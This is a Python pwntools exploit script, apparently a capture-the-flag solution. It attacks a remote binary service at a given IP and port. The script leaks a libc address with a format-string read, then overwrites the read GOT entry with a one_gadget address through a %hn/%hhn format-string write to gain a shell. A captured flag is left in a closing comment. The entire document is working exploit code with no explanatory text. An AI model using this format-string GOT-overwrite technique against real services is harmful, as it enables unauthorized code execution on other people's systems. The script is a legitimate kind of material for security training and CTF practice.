#!/usr/bin/env python
#coding:utf-8
from pwn import*
context(arch='amd64',os='linux',log_level='debug')

binary='./main'
elf=ELF(binary)
libc=elf.libc

# io=process(binary)
io=remote("49.235.243.206",10502)

sl=lambda data :io.sendline(data)
ru=lambda data,drop=True :io.recvuntil(data,drop)
rv=lambda data :io.recv(data)
rl=lambda data :io.recvline(data)
leak=lambda data,addr :log.success('{} = {:#x}'.format(data, addr))
uu32=lambda data   :u32(data.ljust(4, '\0'))
uu64=lambda data   :u64(data.ljust(8, '\0'))
irt=lambda  :io.interactive()

read_got=elf.got['read']

payload='%33$p'
# gdb.attach(io)
# pause()
sl(payload)
ru('0x')
libc_base=int(rv(12),16)-0x7B947
leak('libc_base',libc_base)

one_addr=[0x45216,0x4526a,0xf1147]
one_gadget=libc_base+one_addr[2]
payload = '%' 
payload += str((one_gadget & 0xffff ) - 5) 
payload += 'c'+'aaaaa%12$hn'+'%'+str(((one_gadget >> 16) & 0xff) + 0xb7) 
payload += 'c'+'aa%13$hhn' 
payload += p64(read_got) 
payload += p64(read_got + 2) 
sl(payload)
irt()
#flag{7221CB4A535A0F5E4C47F5FEEC64C952}